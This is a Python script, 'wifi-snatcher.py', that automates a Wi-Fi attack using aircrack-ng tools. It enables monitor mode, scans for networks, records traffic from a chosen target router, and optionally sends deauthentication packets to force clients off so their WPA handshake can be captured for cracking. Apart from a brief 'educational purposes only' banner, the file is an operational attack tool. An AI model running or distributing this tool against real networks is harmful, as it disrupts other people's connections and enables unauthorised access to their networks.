# wifi-snatcher.py
#!/usr/bin/env python3

import subprocess
import os
import time

# Legal warning
print("""
📡 WiFi-Snatcher Educational Wrapper

⚠️ Use this script for educational purposes only.
You must have explicit permission to test any network.
""")

# Ensure script is run as root
if os.geteuid() != 0:
    print("[!] Run this script as root (sudo)")
    exit()

# Get wireless interface
interface = input("Enter your wireless interface (e.g. wlan0): ").strip()

# Start monitor mode
print(f"[+] Enabling monitor mode on {interface}...")
subprocess.call(["airmon-ng", "start", interface])
mon_interface = interface + "mon"

# Scan for networks
print("[+] Launching airodump-ng to scan for nearby networks...")
print("[*] Close the window when you've selected your target BSSID and channel.")
time.sleep(2)
subprocess.call(["x-terminal-emulator", "-e", f"airodump-ng {mon_interface}"])

# Target info
bssid = input("Enter target BSSID (router MAC): ").strip()
channel = input("Enter target channel: ").strip()
outfile = input("Enter name for output file (no extension): ").strip()

# Start capture
print("[+] Starting capture on selected target...")
subprocess.call(["x-terminal-emulator", "-e",
                 f"airodump-ng --bssid {bssid} -c {channel} -w {outfile} {mon_interface}"])

# Deauth optional
deauth = input("Do you want to send deauth packets to capture handshake? (y/n): ").lower()
if deauth == 'y':
    client_mac = input("Enter target client MAC (or leave blank to broadcast): ").strip()
    print("[+] Sending deauth packets...")
    if client_mac:
        subprocess.call(["aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client_mac, mon_interface])
    else:
        subprocess.call(["aireplay-ng", "--deauth", "10", "-a", bssid, mon_interface])

# End monitor mode
input("[+] Press Enter when you're done capturing to disable monitor mode...")
subprocess.call(["airmon-ng", "stop", mon_interface])
print("[✓] Monitor mode stopped. Handshake capture (if any) saved to:", outfile + "*.cap")
